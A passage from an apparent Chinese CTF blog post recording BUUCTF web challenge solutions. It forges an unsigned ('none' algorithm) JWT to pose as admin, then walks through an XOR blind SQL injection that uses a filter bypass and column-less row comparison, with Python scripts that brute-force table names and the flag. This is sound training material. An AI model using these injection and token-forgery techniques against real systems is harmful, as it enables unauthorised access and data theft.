class="string">&#x27;/login&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getflag</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">get</span>(<span class="string">&#x27;/api/flag&#x27;</span>).<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;flag&#125; = data;</span><br><span class="line">        $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>(flag);</span><br><span class="line">    &#125;).<span class="title function_">fail</span>(<span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(xhr.<span class="property">responseJSON</span>.<span class="property">message</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里提示使用了<code>koa</code>来处理静态文件,并且路径直接就是根目录</p>
<p>可以直接通过 <code>网站根目录/Controllers/api.js</code>访问到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://7edb122d-25ac-4584-bee3-90655f589156.node4.buuoj.cn:81/controllers/api.js</span><br></pre></td></tr></table></figure>

<img src="../images/buuctf-web3/image-20221028145915202.png" alt="image-20221028145915202" style="zoom: 80%;" />

<p>这里大概意思就是只要验证了用户名为<code>admin</code>, 就可以返回flag</p>
<p>那么这里先拿到原来的<code>JWT</code>值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MCwidXNlcm5hbWUiOiJhYWEiLCJwYXNzd29yZCI6IjExMSIsImlhdCI6MTY2NjkzOTEzMX0.me3SzN9TLCacXEFk6aqGO9PAw0TkHJOtHRze5hAMIWk</span><br></pre></td></tr></table></figure>

<p>将值修改后使用<code>python</code>来加密成新的<code>JWT</code>串,这里把加密设置为<code>none</code>,<code>secret_id</code>设置为空值就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;secretid&quot;</span>: [],</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;111&quot;</span>,</span><br><span class="line">        <span class="string">&quot;iat&quot;</span>: <span class="number">1666939131</span></span><br><span class="line">    &#125;,</span><br><span class="line">    algorithm=<span class="string">&quot;none&quot;</span>, key=<span class="string">&quot;&quot;</span></span><br><span class="line">).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line">输出:</span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjExMSIsImlhdCI6MTY2NjkzOTEzMX0.</span><br></pre></td></tr></table></figure>

<p>然后使用得到的新<code>JWT</code>登录,显示登录成功并返回了新的<code>cookie</code>值</p>
<p><img src="/../images/buuctf-web3/image-20221028151552718.png" alt="image-20221028151552718"></p>
<p>将新<code>cookie</code>用于请求<code>flag</code>:</p>
<p><img src="/../images/buuctf-web3/image-20221028151712357.png" alt="image-20221028151712357"></p>
<br>

<hr>
<br>

<h1 id="盲注-无列名注入-Ezsqli"><a href="#盲注-无列名注入-Ezsqli" class="headerlink" title="[盲注,无列名注入]Ezsqli"></a>[盲注,无列名注入]Ezsqli</h1><p>先提交点数据试试:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">id=0   Error Occured When Fetch Result.</span><br><span class="line">id=1   Nu1L</span><br><span class="line">id=2   V&amp;N</span><br><span class="line">id=3   Error Occured When Fetch Result.</span><br><span class="line">id=a   bool(false)</span><br><span class="line">id=1&#x27;  bool(false)</span><br><span class="line">id=2 or 1=1# SQL Injection Checked. 存在过滤,猜测是空格或者or</span><br><span class="line">id=1^(1=1)#  Error Occured When Fetch Result.   这里符合id=0时的结果</span><br><span class="line">id=1^(1=2)#  Nu1L  这里符合id=1时的结果</span><br><span class="line">存在异或注入点</span><br></pre></td></tr></table></figure>

<p>库名长度:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1^(length(database())=21)#  返回Error Occured When Fetch Result.</span><br></pre></td></tr></table></figure>

<p>起这么长的名字干啥🤨</p>
<p>剩下的用脚本搞,上脚本之前先试试其他的过滤词</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">id=1^(ascii(substr((select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()),1,1))=97)#</span><br><span class="line">被检测到</span><br><span class="line"></span><br><span class="line">把mysql.innodb_table_stats 换成 information_schema仍会被过滤</span><br><span class="line">换成sys.x$schema_table_statistics_with_buffer 不会被过滤</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">id=1^ (substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema= database()),1,1)=&#x27;a&#x27;) #</span><br><span class="line"></span><br><span class="line">表名:users233333333333333,f1ag_1s_h3r3_hhhhh  </span><br></pre></td></tr></table></figure>

<p>脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>():</span><br><span class="line">    tables_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line"></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: <span class="string">&quot;1^(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema= database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, c)</span><br><span class="line">            &#125;</span><br><span class="line">            res = session.post(base_url, data=data).text</span><br><span class="line">            <span class="built_in">print</span>(data[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Error Occured When Fetch Result.&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                tables_name += c</span><br><span class="line">                <span class="built_in">print</span>(tables_name)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<p>这里由于<code>information_schema</code>被过滤了,所以接下来还需要进行无列名注入:</p>
<p>这里学到了一个无列名注入的新姿势:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1^((select 1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))  返回Error Occured When Fetch Result. </span><br><span class="line">id=1^((select 1,1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))  返回bool(false)</span><br><span class="line">这里说明目标表有两列</span><br></pre></td></tr></table></figure>

<p>这里前面<code>select</code>的结果,也就是<code>(1,1)</code>会和后面的结果去按位比较(<code>ASCII码</code>)</p>
<p>如果前后列数不一致,则会报错. 如果列数一致,再判断整个不等式的真假.  </p>
<p>比较的时候进行按位比较, 假设<code>select * from f1ag_1s_h3r3_hhhhh</code>的结果中,第二列的数据为:<code>flag&#123;aaaaa&#125;</code></p>
<p>这里传入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1^((select 1,&quot;abcd&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</span><br></pre></td></tr></table></figure>

<p>这里将比较”a”和<code>select * from f1ag_1s_h3r3_hhhhh</code>的结果中第一位的<code>ascii</code>码大小</p>
<p>如果首位比较的结果相等,再接着去比较第二位”b”和后面结果的第二个字符</p>
<p>根据这种性质,就可以使用代码来注入了:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>): <span class="comment"># 测试的ascii码范围</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: <span class="string">&quot;1^((select 1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))#&quot;</span>.<span class="built_in">format</span>(flag+<span class="built_in">chr</span>(c))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">print</span>(data[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">            res = session.post(base_url, data=data).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Error Occured When Fetch Result.&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                flag = flag + <span class="built_in">chr</span>(c-<span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> <span class="comment">#输出:FLAG&#123;0F444C84-7580-4A33-B2E8-19FCE4439E7D&#125; </span></span><br></pre></td></tr></table></figure>

<p>注意这里如果返回了<code>Error Occured When Fetch Result</code>,说明当前比较的字母已经大于flag中对应位置的字母了</p>
<p>那么它前一个字母是和flag中对应位置相等的,所以12行是<code>flag = flag + chr(c-1)</code></p>
<p>另外, 上面输出的全都是大写字母的原因是:  <code>mysql</code>中比较是不区分大小写的,所以尽管<code>N</code>的 ascii码小于<code>a</code>,但是在上面判定时还是会判断为<code>N</code>&gt;<code>a</code>  但这不影响我们的结果,只要把上面的flag转为小写就可以了.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;FLAG&#123;0F444C84-7580-4A33-B2E8-19FCE4439E7D&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag.lower())</span><br></pre></td></tr></table></figure>



















































</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://gswanx.github.io">1ustinianus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://gswanx.github.io/post/383bfb1c.html">http://gswanx.github.io/post/383bfb1c.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://gswanx.github.io" target="_blank">逃    避    現    實</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF-Web/">CTF-Web</a></div><div class="post_share"><div class="social-share" data-image="/img/headddd.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/a65f6ebf.html"><img class="prev-cover" src="/img/754566.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">buuctf_web部分刷题记录_PART4</div></div></a></div><div class="next-post pull-right"><a href="/post/4f3ccb8a.html"><img class="next-cover" src="/img/754566.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">buuctf_web部分刷题记录_PART2</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/ef088674.html" title="常用bypass（待更新）"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-17</div><div class="title">常用bypass（待更新）</div></div></a></div><div><a href="/post/aeaad0f.html" title="Apache的文件解析漏洞(特性)"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-23</div><div class="title">Apache的文件解析漏洞(特性)</div></div></a></div><div><a href="/post/e3611a41.html" title="PHP伪协议"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-23</div><div class="title">PHP伪协议</div></div></a></div><div><a href="/post/e40cde58.html" title="ctfshow刷题_web入门命令执行篇"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-24</div><div class="title">ctfshow刷题_web入门命令执行篇</div></div></a></div><div><a href="/post/a65f6ebf.html" title="buuctf_web部分刷题记录_PART4"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-29</div><div class="title">buuctf_web部分刷题记录_PART4</div></div></a></div><div><a href="/post/94662ad7.html" title="SQL注入基础"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-23</div><div class="title">SQL注入基础</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/headddd.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">1ustinianus</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Cf4y1d7Ez"><i class="iconfont icon-yu"></i><span>歇会</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:trajanin117@proton.me" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://music.163.com/#/user/home?id=308450602" target="_blank" title="Music"><i class="fas fa-music"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CV-Maker"><span class="toc-text">[文件上传]CV Maker</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-CyberPunk"><span class="toc-text">[二次注入,报错注入]CyberPunk</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#proc-python%E5%8F%8D%E5%BC%B9shell-PicDown"><span class="toc-text">[proc,python反弹shell]PicDown</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bak%E6%B3%84%E9%9C%B2-%E7%9B%B2%E6%B3%A8-%E8%B8%A9%E5%9D%91%E5%A4%9A-php%E7%9F%AD%E6%A0%87%E7%AD%BE%E4%B8%8A%E4%BC%A0-Easyweb"><span class="toc-text">[bak泄露,盲注(踩坑多),php短标签上传]Easyweb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#perlGET%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-SSRFme"><span class="toc-text">[perlGET命令执行]SSRFme</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cookie-Cookie-Store"><span class="toc-text">[cookie]Cookie Store</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%BB%A4%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-write-shell"><span class="toc-text">[绕过滤写一句话木马]write_shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A5%97%E5%A8%83-Welcome-to-Earth"><span class="toc-text">[套娃]Welcome to Earth</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#koa-JWT-EasyLogin"><span class="toc-text">[koa,JWT]EasyLogin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-Ezsqli"><span class="toc-text">[盲注,无列名注入]Ezsqli</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/bc5fabe9.html" title="JAVA学习路线">JAVA学习路线</a><time datetime="2023-07-31T03:26:12.000Z" title="发表于 2023-07-31 11:26:12">2023-07-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/1a09ef0b.html" title="汇编语言基础知识复习">汇编语言基础知识复习</a><time datetime="2022-10-29T15:33:28.000Z" title="发表于 2022-10-29 23:33:28">2022-10-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/a65f6ebf.html" title="buuctf_web部分刷题记录_PART4">buuctf_web部分刷题记录_PART4</a><time datetime="2022-10-29T01:04:46.000Z" title="发表于 2022-10-29 09:04:46">2022-10-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/383bfb1c.html" title="buuctf_web部分刷题记录_PART3">buuctf_web部分刷题记录_PART3</a><time datetime="2022-10-27T01:20:56.000Z" title="发表于 2022-10-27 09:20:56">2022-10-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/4f3ccb8a.html" title="buuctf_web部分刷题记录_PART2">buuctf_web部分刷题记录_PART2</a><time datetime="2022-10-22T13:19:16.000Z" title="发表于 2022-10-22 21:19:16">2022-10-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/1185562.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2014 - 2023 By 1ustinianus</div><div class="footer_custom_text">func YHZ(){const 💕XAQ bool = True},2022.08.09</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="6770516155" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="🤣,😘,🤨,🥱,😣,😤,😭" data-fontsize="25px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>